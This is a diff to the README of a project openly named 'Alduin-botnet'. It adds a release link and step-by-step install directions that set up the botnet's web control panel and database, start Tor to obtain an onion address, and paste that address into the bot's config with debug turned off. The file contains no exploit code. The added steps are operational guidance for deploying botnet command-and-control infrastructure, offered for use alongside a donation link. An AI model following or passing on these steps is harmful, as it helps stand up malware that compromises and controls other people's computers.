@@ -1,6 +1,14 @@
 # Alduin-botnet
 ![alt text](https://i.imgur.com/NhruoLf.png)
-## Release: (Comming soon) :)
+## Release: https://github.com/mogyiii/Alduin-botnet/releases/tag/1.1
+## Install:
+1. Install Python and PostgreSQL
+2. Open DataBaseCreator and overwrite connect database in appsettings.json.
+3. Import "Alduin/DataBaseCreator/DB/_CreateSchema.sql".
+4. Run "Alduin/DataBaseCreator/Alduin.DatabaseCreator.exe" and follow the instructions.
+5. Run "Alduin/Alduin.Web.exe" and Open "https://127.0.0.1:5001"
+6. Login and navigate to Tor settings and Restart Tor.
+7. Copy Onion Address and Open "Alduin/Bot/Config.Json" and pastle to "Address" and overwirte debug to "false".
 ## Donation
 [![Donate](https://img.shields.io/badge/Donate-PayPal-green.svg)](https://www.paypal.me/mogyiii)
 
